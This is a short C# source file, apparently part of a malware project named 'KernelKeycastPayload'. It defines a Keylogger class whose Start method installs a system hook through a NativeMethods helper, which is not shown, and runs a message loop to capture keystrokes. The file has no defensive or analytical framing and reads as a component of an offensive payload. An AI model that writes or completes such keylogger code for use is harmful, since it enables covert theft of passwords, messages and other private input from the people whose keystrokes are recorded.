using System.Windows.Forms;

namespace KernelKeycastPayload
{
    internal class Keylogger
    {
        public static void Start()
        {
            NativeMethods._hookerId = NativeMethods.SetHook(NativeMethods._proc);
            Application.Run();
            NativeMethods.SetHookerID();
        }
    }
}